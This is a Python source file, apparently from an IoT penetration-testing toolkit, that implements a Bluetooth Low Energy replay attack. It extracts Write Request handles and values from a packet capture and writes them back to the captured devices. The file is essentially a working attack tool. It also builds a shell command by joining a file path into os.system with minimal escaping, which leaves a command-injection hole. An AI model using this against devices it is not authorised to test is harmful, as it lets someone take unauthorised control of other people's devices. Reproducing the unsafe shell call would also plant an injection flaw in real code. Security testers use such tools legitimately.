import os
from protocols.BLE.ble_device import BLEDevice


class BLEReplayAttackHelper:
    """
    This is the helper class which is used to perform BLE Replay attack.
    """

    def __init__(self, file_path):
        self.file_path = file_path
        self.write_requests = {}
        self.run()

    def run(self):
        self.create_tmp_file()
        self.get_write_requests()
        self.replay_write_requests()
        self.delete_tmp_file()

    def create_tmp_file(self):
        """
        Convert pcap file to txt
        """
        # convert pcap file to .txt file
        file_path = "\\ ".join(self.file_path.split())
        os.system("tshark -X lua_script:tmp.txt -r " + file_path + " -V -T text > tmp.txt")

    def get_write_requests(self):
        """
        Retrieves all write requests from the given file
        """
        # Open the file
        f = open("tmp.txt", "r")
        # Get the content of the file
        content = f.read()
        # Get frames
        frames = content.split("\n\n")
        # Search each frame to find Write Requests
        for frame in frames:
            try:
                # Slave address index
                slave_address_index = frame.index("Slave Address:")
                # Update the frame
                frame = frame[slave_address_index:]
                # Get the slave address
                open_para_index = frame.index("(")
                close_para_index = frame.index(")")
                slave_address = frame[open_para_index + 1:close_para_index]
                # Write request index
                write_request_index = frame.index("Opcode: Write Request")
                # Update the frame
                frame = frame[write_request_index:]
                # Handle index
                handle_index = frame.index("Handle:") + 8
                # Update the frame
                frame = frame[handle_index:]
                # Space index
                space_index = frame.index(" ")
                # Get the handle
                handle = frame[:space_index]
                # Value index
                value_index = frame.index("Value:") + 7
                # Get the value
                value = frame[value_index:]
                # Add handle-value to the list
                if slave_address in self.write_requests:
                    self.write_requests[slave_address].append({"handle": handle, "value": value})
                else:
                    self.write_requests[slave_address] = [{"handle": handle, "value": value}]
            except ValueError:
                pass
        print "retrieved write requests"

    def replay_write_requests(self):
        """
        Replay all write requests
        """
        # Replay all write request
        for slave_address in self.write_requests:
            # Create a connection to the device
            device = BLEDevice(slave_address)
            # Replay all write request belonging to the device
            for handle_value_pair in self.write_requests[slave_address]:
                handle = handle_value_pair["handle"]
                value = handle_value_pair["value"]
                device.writecmd(handle, value)
                print "wrote " + value + " to handle: " + handle

    def delete_tmp_file(self):
        """
        Delete the created tmp file
        """
        os.remove("tmp.txt")
